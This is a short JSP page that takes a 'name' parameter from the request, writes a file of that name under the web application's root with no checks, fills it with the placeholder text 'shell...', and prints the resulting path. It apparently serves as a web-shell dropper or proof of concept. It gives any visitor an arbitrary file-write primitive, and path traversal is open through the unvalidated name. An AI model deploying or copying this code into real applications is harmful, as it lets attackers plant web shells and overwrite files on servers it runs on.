<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileOutputStream" %>

<%
    String name = request.getParameter("name");
    File file = new File(request.getRealPath("/"), name);
    FileOutputStream fos = new FileOutputStream(file);
    fos.write("shell...".getBytes());
    fos.flush();
    fos.close();

    out.println(file.getAbsolutePath() + "\t" + file.exists());
%>